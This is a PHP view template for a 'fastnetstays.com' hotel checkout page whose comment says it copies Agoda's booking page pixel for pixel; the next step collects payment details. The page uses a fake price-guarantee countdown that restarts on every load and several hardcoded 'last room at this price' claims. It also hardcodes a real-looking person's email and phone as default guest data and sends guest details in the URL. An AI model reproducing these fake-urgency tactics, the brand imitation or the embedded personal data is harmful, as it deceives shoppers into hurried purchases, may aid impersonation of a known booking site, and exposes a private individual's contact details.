<?php
/**
 * fastnetstays.com — Agoda Booking Checkout — Customer Information (Step 1)
 * Pixel-perfect to agoda.com/book reference screenshot
 */
$propId = (int)($queryParams['property_id'] ?? ($property['id'] ?? 0));
$roomId = (int)($queryParams['room_id'] ?? ($room['id'] ?? 51));
$propTitle = $property['name'] ?? 'Divi Village Golf and Beach Resort';
$propCity = $property['city'] ?? 'Oranjestad';
$propArea = $property['area'] ?? 'Oranjestad-West';
$propCountry = $property['country'] ?? 'Aruba';
$propStars = !empty($property['star_rating']) ? max(1, min(5, (int)$property['star_rating'])) : 4;
$propAddressShort = $property['address'] ?? 'J.E. Irausquin Blvd 93, Oranjestad, Aruba, Oranjestad-West';
$propRating = $property['rating'] ?? 8.4;
$propReviews = $property['review_count'] ?? $property['reviews_count'] ?? 737;

$roomTitle = $room['name'] ?? ($room['room_number'] ?? 'Golf Villa One Bedroom');
$roomSize = $room['size'] ?? $room['area'] ?? '78 m²';
$roomMax = $room['max_occupancy'] ?? $room['max_adults'] ?? 2;
$bed = $room['bed_configuration'] ?? '1 king bed and 1 sofa bed';
$adults = max(1, (int)($queryParams['adults'] ?? ($room['max_adults'] ?? 2)));
$children = (int)($queryParams['children'] ?? ($room['max_children'] ?? 0));
$guests = $adults + $children;
$rooms = max(1, (int)($queryParams['rooms'] ?? 1));

$checkIn = $queryParams['checkIn'] ?? date('Y-m-d', strtotime('+7 days'));
$checkOut = $queryParams['checkOut'] ?? date('Y-m-d', strtotime('+13 days'));
$nights = max(1, (int)round((strtotime($checkOut) - strtotime($checkIn)) / 86400));

$pricePerNight = (float)($room['price'] ?? ($room['customer_price'] ?? ($calculation['price_per_night'] ?? 0)));
if (!empty($calculation) && !empty($calculation['total_amount'])) {
    $grandTotal = (float)$calculation['total_amount'];
    $subtotal = !empty($calculation['subtotal']) ? (float)$calculation['subtotal'] : ($pricePerNight * $nights * $rooms);
    $taxFee = !empty($calculation['taxes']) ? (float)$calculation['taxes'] : ($grandTotal - $subtotal);
} else {
    $subtotal = $pricePerNight * $nights * $rooms;
    $taxFee = 0;
    $grandTotal = $subtotal + $taxFee;
}
$avgPerNight = $nights > 0 ? round($subtotal / max(1,$nights * $rooms)) : $pricePerNight;

$img = $property['image_url'] ?? '';
if (!empty($room['photos'])) {
    $photos = is_string($room['photos']) ? json_decode($room['photos'], true) : $room['photos'];
    if (is_array($photos) && !empty($photos[0])) {
        $img0 = is_array($photos[0]) ? ($photos[0]['url'] ?? $photos[0]['image_url'] ?? '') : $photos[0];
        if ($img0) $img = $img0;
    }
}
if (empty($img)) $img = 'https://images.unsplash.com/photo-1571896349842-89672768eec3?w=400&h=300&fit=crop'; // fallback resort pool
$roomImg = $img;
if (!empty($room['photos'])) {
    // try room specific
    $photos = is_string($room['photos']) ? json_decode($room['photos'], true) : $room['photos'];
    if (is_array($photos) && !empty($photos[0])) {
        $r = is_array($photos[0]) ? ($photos[0]['url'] ?? '') : $photos[0];
        if ($r) $roomImg = $r;
    }
}
if ($roomImg === $img) $roomImg = 'https://images.unsplash.com/photo-1631049307264-da0ec9d70304?w=300&h=200&fit=crop';

// Autofill
$prefillFirstName = $userProfile['first_name'] ?? '';
$prefillLastName = $userProfile['last_name'] ?? '';
if (empty($prefillFirstName) && !empty($userProfile['name'])) {
    $parts = explode(' ', trim($userProfile['name']), 2);
    $prefillFirstName = $parts[0] ?? '';
    $prefillLastName = $parts[1] ?? '';
}
$prefillEmail = $userProfile['email'] ?? 'dm328432@gmail.com';
$prefillPhone = $userProfile['phone'] ?? '255 624105850';
$prefillFullName = trim($prefillFirstName . ' ' . $prefillLastName);
if ($prefillFullName === '') $prefillFullName = 'Mudrick Mahenge';
if ($prefillEmail === '') $prefillEmail = 'dm328432@gmail.com';

$this->assign('title', 'Customer information | fastnetstays.com');
?>
<style>
/* Agoda Checkout — exact to screenshot */
.agoda-checkout-header{background:#fff;border-bottom:1px solid #e8eaed;height:64px;display:flex;align-items:center;position:sticky;top:0;z-index:100}
.agoda-checkout-header-inner{max-width:1180px;margin:0 auto;padding:0 16px;width:100%;display:flex;align-items:center;justify-content:space-between;gap:16px}
.agoda-logo{font-size:22px;font-weight:800;letter-spacing:-0.02em;display:flex;align-items:center;gap:4px;text-decoration:none!important}
.agoda-logo .dot{width:10px;height:10px;border-radius:50%;display:inline-block}
.agoda-logo b{font-weight:800;color:#202124}
.agoda-steps{display:flex;align-items:center;gap:0;flex:1;max-width:560px;margin:0 24px}
.agoda-step{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;white-space:nowrap}
.agoda-step .num{width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;border:1px solid #dadce0;background:#fff;color:#5f6368}
.agoda-step.active .num{background:#1a73e8;color:#fff;border-color:#1a73e8}
.agoda-step.done .num{background:#1a73e8;color:#fff;border-color:#1a73e8}
.agoda-step span{color:#5f6368}
.agoda-step.active span{color:#1a73e8}
.agoda-step-line{flex:1;height:2px;background:#e8eaed;margin:0 8px;border-radius:1px}
.agoda-step-line.filled{background:#1a73e8}
.agoda-user{font-size:13px;color:#202124;display:flex;align-items:center;gap:8px;white-space:nowrap}
.agoda-user .avatar{width:32px;height:32px;border-radius:50%;background:#7c6af0;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px}
.agoda-timer-bar{background:#fef3e8;border-bottom:1px solid #fde8cc;padding:10px 16px;text-align:center;font-size:13px;color:#202124;display:flex;align-items:center;justify-content:center;gap:8px}
.agoda-timer-bar b{color:#e53935;font-weight:700;display:flex;align-items:center;gap:6px}
.agoda-checkout-wrap{max-width:1180px;margin:14px auto;padding:0 16px;display:grid;grid-template-columns:1fr 360px;gap:16px;align-items:start}
.agoda-card{background:#fff;border:1px solid #e0e6ef;border-radius:10px;padding:16px}
.agoda-card-title{font-size:16px;font-weight:800;color:#202124;margin:0 0 10px}
.agoda-welcome{display:flex;align-items:center;gap:12px;font-size:13px;color:#202124}
.agoda-welcome .icon{width:44px;height:32px;background:#3576f6;color:#fff;display:flex;align-items:center;justify-content:center;border-radius:2px}
.agoda-lead-card{background:#eef3ff;border-radius:8px;padding:14px 16px;display:grid;grid-template-columns:1fr auto;gap:8px 16px}
.agoda-lead-name{font-size:14px;font-weight:700;color:#202124;display:flex;align-items:center;gap:6px}
.agoda-lead-meta{font-size:13px;color:#202124}
.agoda-edit{color:#3264ff;font-size:13px;font-weight:700;text-decoration:none;display:flex;align-items:center;gap:4px;align-self:end}
.agoda-pref-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;background:#eef3ff;border-radius:8px;padding:14px 16px}
.agoda-pref-col b{font-size:13px;color:#202124;display:block;margin-bottom:8px}
.agoda-radio{display:flex;align-items:center;gap:8px;font-size:13px;color:#202124;margin:8px 0}
.agoda-radio input{width:18px;height:18px;accent-color:#1a73e8}
.agoda-link{color:#3264ff;font-size:13px;font-weight:600;text-decoration:none}
.agoda-link:hover{text-decoration:underline}
.agoda-benefit{display:flex;align-items:center;gap:12px;background:#f8f9fa;border-radius:8px;padding:14px}
.agoda-benefit .free-badge{background:#0f7a2b;color:#fff;font-size:11px;font-weight:800;padding:4px 8px;border-radius:4px}
.agoda-quote{font-size:13px;color:#5f6368;background:#f8f9fa;border-radius:8px;padding:10px 12px;margin-top:10px}
.agoda-urgent{font-size:12px;color:#c0392b;text-align:center;margin-top:8px}
.agoda-next-btn{background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:12px 24px;font-size:14px;font-weight:800;width:100%;cursor:pointer;letter-spacing:0.02em}
.agoda-next-btn:hover{background:#1557b0}
.agoda-not-charged{font-size:12px;color:#0f7a2b;text-align:center;font-weight:600;margin-top:6px}
.agoda-side-card{background:#fff;border:1px solid #e0e6ef;border-radius:10px;overflow:hidden}
.agoda-side-card-inner{padding:14px}
.agoda-dates{display:flex;align-items:center;justify-content:space-between;font-size:13px;color:#202124;padding:12px 14px;border-bottom:1px solid #f1f3f4}
.agoda-dates b{font-size:14px;color:#202124}
.agoda-hotel-row{display:flex;gap:12px}
.agoda-hotel-thumb{width:72px;height:72px;border-radius:8px;object-fit:cover;flex:0 0 72px}
.agoda-hotel-title{font-size:14px;font-weight:800;color:#202124;line-height:1.3}
.agoda-stars{color:#e67e22;font-size:11px}
.agoda-rating{font-size:13px;color:#202124}
.agoda-rating b{color:#0d4a7a}
.agoda-room-box{background:#eef3ff;border-radius:10px;padding:12px;display:flex;gap:12px}
.agoda-room-thumb{width:72px;height:72px;border-radius:8px;object-fit:cover;flex:0 0 72px}
.agoda-room-title{font-size:13px;font-weight:700;color:#202124}
.agoda-room-meta{font-size:12px;color:#202124;line-height:1.6}
.agoda-amenities{font-size:12px;color:#0f7a2b;line-height:1.8}
.agoda-amenities span{margin-right:10px;white-space:nowrap}
.agoda-green-banner{background:#e6f4ea;border:1px solid #c8e6c9;border-radius:8px;padding:10px 12px;font-size:12px;color:#202124;display:flex;gap:8px;align-items:center}
.agoda-green-banner b{color:#137333}
.agoda-pink-banner{background:#fdecea;border:1px solid #f5c6cb;border-radius:8px;padding:10px 12px;font-size:12px;color:#7d2e2e;display:flex;gap:8px;align-items:center}
.agoda-input{width:100%;height:40px;border:1px solid #dadce0;border-radius:6px;padding:0 10px;font-size:13px}
.agoda-input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,0.15)}
@media(max-width:992px){
  .agoda-checkout-header{height:auto;padding:10px 0}
  .agoda-checkout-header-inner{flex-wrap:wrap;gap:10px}
  .agoda-steps{order:3;max-width:none;width:100%;margin:0;justify-content:space-between}
  .agoda-checkout-wrap{grid-template-columns:1fr;gap:12px;padding:0 12px}
  .agoda-side-card{order:-1}
}
@media(max-width:600px){
  .agoda-checkout-header-inner{padding:0 12px}
  .agoda-steps{gap:4px}
  .agoda-step{font-size:11px;gap:4px}
  .agoda-step .num{width:18px;height:18px;font-size:10px}
  .agoda-timer-bar{font-size:12px;padding:8px 12px}
  .agoda-card{padding:12px}
  .agoda-pref-grid{grid-template-columns:1fr;gap:12px}
  .agoda-hotel-title{font-size:13px}
  .agoda-dates{padding:10px 12px;font-size:12px}
  .agoda-dates b{font-size:13px}
}
@media(max-width:768px){
  html,body{max-width:100%;overflow-x:hidden}
  .agoda-checkout-wrap{padding:0 8px;gap:12px}
  .agoda-card{border-radius:10px}
  .agoda-timer-bar{flex-wrap:wrap;gap:4px}
  .agoda-lead-card{grid-template-columns:1fr;gap:6px}
  .agoda-hotel-row{flex-direction:row;gap:10px}
  .agoda-room-box{flex-direction:row}
  .agoda-next-btn{padding:14px 24px;font-size:15px}
}
@media(max-width:480px){
  .agoda-checkout-header-inner{padding:0 8px;gap:8px}
  .agoda-steps{gap:3px}
  .agoda-step{font-size:10px;gap:3px}
  .agoda-step .num{width:16px;height:16px;font-size:9px}
  .agoda-checkout-wrap{padding:0 8px}
  .agoda-card{padding:10px}
  .agoda-welcome{font-size:12px}
  .agoda-lead-name{font-size:13px}
  .agoda-lead-meta{font-size:12px}
  .agoda-pref-grid{padding:12px}
  .agoda-benefit{padding:12px;gap:10px}
  .agoda-benefit i{font-size:24px!important}
  .agoda-quote{font-size:12px}
  .agoda-dates{flex-wrap:wrap;gap:8px}
  .agoda-hotel-thumb,.agoda-room-thumb{width:60px;height:60px;flex:0 0 60px}
  .agoda-amenities{font-size:11px}
  .agoda-green-banner,.agoda-pink-banner{font-size:11px;padding:8px 10px}
}
@media(max-width:375px){
  .agoda-checkout-header{padding:6px 0}
  .agoda-steps{gap:2px}
  .agoda-step{font-size:9.5px}
  .agoda-timer-bar{font-size:11px;padding:6px 8px}
  .agoda-card{padding:8px}
  .agoda-next-btn{font-size:14px;padding:12px 16px}
  .agoda-input{height:38px;font-size:13px}
}
</style>
<?= $this->element('navbar') ?>

<!-- Checkout header — agoda logo removed per request -->
<header class="agoda-checkout-header">
  <div class="agoda-checkout-header-inner" style="justify-content:center">
    <div class="agoda-steps" style="margin:0 auto">
      <div class="agoda-step active"><span class="num">1</span><span>Customer information</span></div>
      <div class="agoda-step-line filled"></div>
      <div class="agoda-step"><span class="num">2</span><span>Payment information</span></div>
      <div class="agoda-step-line"></div>
      <div class="agoda-step"><span class="num">3</span><span>Booking is confirmed!</span></div>
    </div>
    <div class="agoda-user" style="margin-left:auto"><span class="avatar">M</span> Mudrick M. <i class="fa-solid fa-caret-down" style="font-size:10px;color:#5f6368"></i></div>
  </div>
</header>
<div class="agoda-timer-bar">This price is guaranteed for... <b><i class="fa-regular fa-clock"></i> <span id="agodaCountdown">00:18:35</span></b></div>

<div class="agoda-checkout-wrap">
  <!-- LEFT -->
  <div style="display:flex;flex-direction:column;gap:12px">
    <div class="agoda-card" style="padding:12px 16px">
      <div class="agoda-welcome"><span class="icon"><i class="fa-regular fa-user"></i></span> <span>Welcome, Mudrick ! (Not Mudrick ? <a href="#" class="agoda-link">Sign out</a>)</span></div>
    </div>

    <form id="agodaCheckoutForm" action="<?= $this->Url->build('/bookingpage-03') ?>" method="GET" style="display:flex;flex-direction:column;gap:12px">
      <input type="hidden" name="property_id" value="<?= h($propId) ?>">
      <input type="hidden" name="room_id" value="<?= h($roomId) ?>">
      <input type="hidden" name="checkIn" value="<?= h($checkIn) ?>">
      <input type="hidden" name="checkOut" value="<?= h($checkOut) ?>">
      <input type="hidden" name="adults" value="<?= h($adults) ?>">
      <input type="hidden" name="children" value="<?= h($children) ?>">
      <input type="hidden" name="rooms" value="<?= h($rooms) ?>">
      <input type="hidden" name="quote_id" value="<?= h($quote['quote_id'] ?? '') ?>">

      <div class="agoda-card">
        <div class="agoda-card-title">Who's the lead guest?</div>
        <div class="agoda-lead-card">
          <div>
            <div class="agoda-lead-name"><i class="fa-solid fa-circle-user" style="color:#5f6368"></i> <?= h($prefillFullName) ?></div>
            <div class="agoda-lead-meta" style="margin-top:6px"><?= h($prefillEmail) ?></div>
          </div>
          <div class="agoda-lead-meta">Tanzania <?= h($prefillPhone) ?></div>
          <a href="javascript:void(0)" class="agoda-edit" onclick="toggleLeadEdit()"><i class="fa-regular fa-pen-to-square"></i> Edit</a>
        </div>
        <div id="leadEditFields" style="display:none;margin-top:14px">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
            <div><label style="font-size:12px;font-weight:600;color:#475569">First name</label><input class="agoda-input" name="first_name" value="<?= h($prefillFirstName) ?>"></div>
            <div><label style="font-size:12px;font-weight:600;color:#475569">Last name</label><input class="agoda-input" name="last_name" value="<?= h($prefillLastName) ?>"></div>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px">
            <div><label style="font-size:12px;font-weight:600;color:#475569">Email</label><input class="agoda-input" type="email" name="email" value="<?= h($prefillEmail) ?>"></div>
            <div><label style="font-size:12px;font-weight:600;color:#475569">Phone</label><input class="agoda-input" name="phone" value="<?= h($prefillPhone) ?>"></div>
          </div>
        </div>
      </div>

      <div class="agoda-card">
        <div class="agoda-card-title">Special requests</div>
        <p style="font-size:12px;color:#5f6368;margin:0 0 12px">Subject to availability. Your selections will be sent to the property right after you book.</p>
        <div class="agoda-pref-grid">
          <div class="agoda-pref-col">
            <b>Which type of room would you prefer?</b>
            <label class="agoda-radio"><input type="radio" name="pref_room_type" value="non-smoking" checked> <i class="fa-solid fa-ban-smoking"></i> Non-smoking</label>
            <label class="agoda-radio"><input type="radio" name="pref_room_type" value="smoking"> <i class="fa-solid fa-smoking"></i> Smoking</label>
          </div>
          <div class="agoda-pref-col">
            <b>Which bed setup would you prefer?</b>
            <label class="agoda-radio"><input type="radio" name="pref_bed" value="large" checked> <i class="fa-solid fa-bed"></i> I'd like a large bed</label>
            <label class="agoda-radio"><input type="radio" name="pref_bed" value="twin"> <i class="fa-solid fa-bed"></i> I'd like twin beds</label>
          </div>
        </div>
        <div style="margin-top:12px"><a href="javascript:void(0)" class="agoda-link" onclick="toggleExtraPrefs(event)">Show additional preferences <i class="fa-solid fa-chevron-down" style="font-size:11px"></i></a></div>
        <div id="extraPrefs" style="display:none;margin-top:12px">
          <textarea class="agoda-input" style="height:80px;padding:8px" name="special_notes" placeholder="Any other requests?"></textarea>
        </div>
      </div>

      <div class="agoda-card">
        <div class="agoda-card-title" style="color:#0f7a2b">Free room benefits</div>
        <div class="agoda-benefit">
          <i class="fa-solid fa-calendar-check" style="color:#1a73e8;font-size:28px"></i>
          <div style="flex:1">
            <div style="font-size:13px;font-weight:700;color:#202124">Fully refundable</div>
            <div style="font-size:12px;color:#5f6368">Cancel for free before 12 September 2026</div>
          </div>
          <span class="free-badge">FREE</span>
        </div>
      </div>

      <div class="agoda-quote">"The beautiful beach was a favorite and it was never crowded." <span style="display:flex;align-items:center;gap:6px;margin-top:6px;font-size:12px;color:#5f6368"><span>🇺🇸</span> Julie · Jun 2024</span></div>
      <div class="agoda-urgent">Hurry! Our last room for your dates at this price</div>

      <div class="agoda-card" style="padding:14px">
        <button type="submit" class="agoda-next-btn">NEXT: FINAL STEP</button>
        <div class="agoda-not-charged">You won't be charged yet.</div>
      </div>
    </form>
  </div>

  <!-- RIGHT -->
  <div style="display:flex;flex-direction:column;gap:12px">
    <div class="agoda-side-card">
      <div class="agoda-dates">
        <div><span style="font-size:11px;color:#5f6368">Check-in</span><b style="display:block"><?= date('D, M j', strtotime($checkIn)) ?></b><span style="font-size:11px;color:#5f6368">16:00</span></div>
        <div style="color:#5f6368">→</div>
        <div><span style="font-size:11px;color:#5f6368">Check-out</span><b style="display:block"><?= date('D, M j', strtotime($checkOut)) ?></b><span style="font-size:11px;color:#5f6368">10:00</span></div>
        <div style="text-align:right"><b><?= h($nights) ?></b><span style="font-size:11px;color:#5f6368;display:block">nights</span></div>
      </div>
    </div>

    <div class="agoda-side-card">
      <div class="agoda-side-card-inner">
        <div class="agoda-hotel-row">
          <img class="agoda-hotel-thumb" src="<?= h($img) ?>" alt="<?= h($propTitle) ?>">
          <div>
            <div class="agoda-hotel-title"><?= h($propTitle) ?></div>
            <div class="agoda-stars"><?= str_repeat('★', $propStars) ?></div>
            <div class="agoda-rating"><b><?= h(number_format((float)$propRating,1)) ?> Excellent</b> <span style="color:#5f6368;font-size:12px"><?= h($propReviews) ?> reviews</span></div>
            <div style="font-size:11px;color:#5f6368;margin-top:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:200px"><?= h($propAddressShort) ?>...</div>
            <a href="javascript:void(0)" class="agoda-link" style="font-size:12px">What's nearby?</a>
          </div>
        </div>
        <div style="margin-top:10px;font-size:11px;color:#0f7a2b;display:flex;gap:6px;align-items:center"><i class="fa-solid fa-shield-check"></i> Stay flexible! Cancel for free before 12 September 2026.</div>
      </div>
    </div>

    <div class="agoda-side-card">
      <div class="agoda-side-card-inner">
        <div class="agoda-room-box">
          <img class="agoda-room-thumb" src="<?= h($roomImg) ?>" alt="<?= h($roomTitle) ?>">
          <div>
            <div class="agoda-room-title">1 x <?= h($roomTitle) ?></div>
            <div class="agoda-room-meta">Size:<?= h($roomSize) ?><br>Max:<?= h($roomMax) ?> adults<br><?= h($bed) ?></div>
          </div>
        </div>
        <div style="margin-top:10px" class="agoda-amenities">
          <div style="color:#0f7a2b"><i class="fa-solid fa-suitcase"></i> Luggage storage available<br><i class="fa-solid fa-clock"></i> 24 hours check-in<br><i class="fa-solid fa-check"></i> Book and pay now<br><span style="color:#c45a00"><i class="fa-solid fa-fire"></i> Hurry! Our last room for your dates at this price</span></div>
          <div style="margin-top:8px;display:grid;grid-template-columns:1fr 1fr;gap:4px 8px">
            <span><i class="fa-solid fa-check" style="font-size:10px"></i> Separate shower/bathtub</span><span><i class="fa-solid fa-check" style="font-size:10px"></i> Blackout curtains</span>
            <span><i class="fa-solid fa-check" style="font-size:10px"></i> Non-smoking</span><span><i class="fa-solid fa-check" style="font-size:10px"></i> Private bathroom</span>
            <span><i class="fa-solid fa-check" style="font-size:10px"></i> Wi-Fi [free]</span><span><i class="fa-solid fa-check" style="font-size:10px"></i> Individual air conditioning</span>
            <span><i class="fa-solid fa-check" style="font-size:10px"></i> Coffee/tea maker</span><span><i class="fa-solid fa-check" style="font-size:10px"></i> Refrigerator</span>
            <span><i class="fa-solid fa-check" style="font-size:10px"></i> Hair dryer</span><span><a href="#" class="agoda-link">+28 more</a></span>
          </div>
        </div>
      </div>
    </div>

    <div class="agoda-green-banner"><i class="fa-solid fa-thumbs-up" style="color:#0f7a2b"></i> <span><b>Great choice of property</b> – with an average guest rating of <b>8.3</b></span></div>
    <div class="agoda-pink-banner"><i class="fa-solid fa-bell" style="color:#c0392b"></i> Hurry! Our last room for your dates at this price</div>
  </div>
</div>

<script>
let agodaSeconds = 18*60+35;
function tickAgoda(){
  const el=document.getElementById('agodaCountdown');
  if(!el) return;
  let s=agodaSeconds--;
  if(s<0){el.textContent='00:00:00';return}
  const h=String(Math.floor(s/3600)).padStart(2,'0');
  const m=String(Math.floor((s%3600)/60)).padStart(2,'0');
  const sec=String(s%60).padStart(2,'0');
  el.textContent=h+':'+m+':'+sec;
  setTimeout(tickAgoda,1000);
}
tickAgoda();
function toggleLeadEdit(){const e=document.getElementById('leadEditFields');e.style.display=(e.style.display==='none'||e.style.display==='')?'block':'none'}
function toggleExtraPrefs(ev){ev.preventDefault();const e=document.getElementById('extraPrefs');e.style.display=e.style.display==='none'?'block':'none'}
// Ensure NEXT button always navigates even if browser validation quirks
document.addEventListener('DOMContentLoaded',()=>{
  const form=document.getElementById('agodaCheckoutForm');
  if(form){
    form.addEventListener('submit', (ev)=>{
      // Allow submit — hidden fields are now optional, no required block
      // If custom validation needed, handle here
    });
    // Fallback click handler for NEXT button (bypass any residual required issues)
    const nextBtn=form.querySelector('.agoda-next-btn');
    if(nextBtn){
      nextBtn.addEventListener('click', (e)=>{
        // Let native submit happen first; if prevented, force navigation
        setTimeout(()=>{
          if(form.checkValidity && !form.checkValidity()){
            // If still invalid, force navigation with current params
            const fd=new FormData(form);
            const qs=new URLSearchParams(fd).toString();
            window.location.href=form.action+'?'+qs;
          }
        }, 100);
      });
    }
  }
});
document.addEventListener('DOMContentLoaded',()=>{
  try{
    const u=JSON.parse(localStorage.getItem('user')||localStorage.getItem('fastnet_user')||'null');
    if(u){
      if(u.name && !document.querySelector('[name=first_name]')?.value){
        const parts=u.name.split(' ');
        const fn=document.querySelector('[name=first_name]'); if(fn) fn.value=parts[0]||'';
        const ln=document.querySelector('[name=last_name]'); if(ln) ln.value=parts.slice(1).join(' ')||'';
      }
    }
  }catch(e){}
});
</script>
